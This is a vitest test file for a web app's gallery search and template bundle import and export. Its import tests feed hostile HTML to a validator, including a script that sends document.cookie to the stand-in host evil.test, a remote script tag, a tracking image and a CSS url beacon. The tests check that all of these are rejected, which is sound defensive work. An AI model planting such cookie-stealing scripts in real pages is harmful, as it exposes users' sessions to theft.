import { describe, expect, it } from "vitest";
import { GALLERY } from "./galleryData";
import {
  BUNDLE_FORMAT,
  MAX_BUNDLE_BYTES,
  bundleFilename,
  categoriesOf,
  exportBundle,
  filterGallery,
  parseBundle,
  scoreItem,
} from "./galleryHelpers";

const APP = "<!doctype html><html><head><title>T</title></head><body>hi</body></html>";

describe("filterGallery", () => {
  it("returns everything in catalogue order with no filters", () => {
    expect(filterGallery(GALLERY, {}).map((g) => g.id)).toEqual(GALLERY.map((g) => g.id));
  });

  it("ranks name matches above tag matches", () => {
    const r = filterGallery(GALLERY, { query: "menu" });
    expect(r[0].id).toBe("g-menu-qr");
  });

  it("requires every word to match and finds by tag and prefix", () => {
    expect(filterGallery(GALLERY, { query: "salon" }).map((g) => g.id)).toEqual(["g-booking"]);
    expect(filterGallery(GALLERY, { query: "budg" }).map((g) => g.id)).toContain("g-expense-tracker");
    expect(filterGallery(GALLERY, { query: "menu zzzz" })).toEqual([]);
  });

  it("filters by category and kind", () => {
    expect(filterGallery(GALLERY, { category: "Business" }).every((g) => g.category === "Business")).toBe(true);
    const server = filterGallery(GALLERY, { kind: "server" });
    expect(server).toHaveLength(3);
    expect(server.every((g) => g.kind === "server")).toBe(true);
    expect(filterGallery(GALLERY, { kind: "studio", category: "Mobile" })).toEqual([]);
  });

  it("scores 0 for a non-match", () => {
    expect(scoreItem(GALLERY[0], "qqqq")).toBe(0);
  });

  it("lists categories once each", () => {
    const c = categoriesOf(GALLERY);
    expect(new Set(c).size).toBe(c.length);
    expect(c).toContain("Learning");
  });
});

describe("template bundle", () => {
  it("round-trips through export and import", () => {
    const text = exportBundle({ name: "My Shop", emoji: "🧁", html: APP, tags: ["Shop", " "] }, new Date("2026-09-30T00:00:00Z"));
    const r = parseBundle(text);
    expect(r.ok).toBe(true);
    if (r.ok) {
      expect(r.bundle.name).toBe("My Shop");
      expect(r.bundle.tags).toEqual(["shop"]);
      expect(r.bundle.html).toBe(APP);
      expect(r.bundle.exportedAt).toBe("2026-09-30T00:00:00.000Z");
    }
  });

  it("exports only app source, never saved data", () => {
    const text = exportBundle({ name: "A", emoji: "x", html: APP, appData: { secret: "1" } } as never);
    expect(text).not.toContain("secret");
    expect(Object.keys(JSON.parse(text)).sort()).toEqual(["blurb", "category", "emoji", "exportedAt", "format", "html", "name", "tags", "version"]);
  });

  it.each([
    ["", "empty"],
    ["not json", "valid JSON"],
    ["[]", "Not a template"],
    [JSON.stringify({ format: "other" }), "VegaDuta template"],
    [JSON.stringify({ format: BUNDLE_FORMAT, version: 99, name: "a", html: APP }), "newer"],
    [JSON.stringify({ format: BUNDLE_FORMAT, version: 1, name: "  ", html: APP }), "no name"],
    [JSON.stringify({ format: BUNDLE_FORMAT, version: 1, name: "a", html: "<p>x</p>" }), "complete HTML"],
    [JSON.stringify({ format: BUNDLE_FORMAT, version: 1, name: "a", html: APP.replace("hi", '<script src="https://evil.test/x.js"></script>') }), "external"],
    [JSON.stringify({ format: BUNDLE_FORMAT, version: 1, name: "a", html: APP.replace("hi", "<iframe></iframe>") }), "external"],
    [JSON.stringify({ format: BUNDLE_FORMAT, version: 1, name: "a", html: APP.replace("hi", "http://localhost:3000") }), "localhost"],
  ])("rejects bad input %#", (text, fragment) => {
    const r = parseBundle(text);
    expect(r.ok).toBe(false);
    if ("error" in r) expect(r.error).toContain(fragment);
  });

  it("rejects oversized files", () => {
    const r = parseBundle("x".repeat(MAX_BUNDLE_BYTES + 1));
    expect(r.ok).toBe(false);
  });

  it("makes safe filenames", () => {
    expect(bundleFilename("My Shop! 2026")).toBe("my-shop-2026.vegaduta-template.json");
    expect(bundleFilename("!!!")).toBe("app.vegaduta-template.json");
  });

  it("rejects network calls and remote resources in imported html", () => {
    const wrap = (body: string) => JSON.stringify({ format: BUNDLE_FORMAT, version: 1, name: "x", html: `<!doctype html><html><body>${body}</body></html>` });
    for (const body of ["<script>fetch('https://evil.test/'+document.cookie)</script>", "<img src=\"https://evil.test/p.gif\">", "<style>a{background:url(//evil.test/x)}</style>", "<script>new XMLHttpRequest()</script>"]) {
      expect(parseBundle(wrap(body)).ok, body).toBe(false);
    }
    expect(parseBundle(wrap("<p>ok</p>")).ok).toBe(true);
  });
});
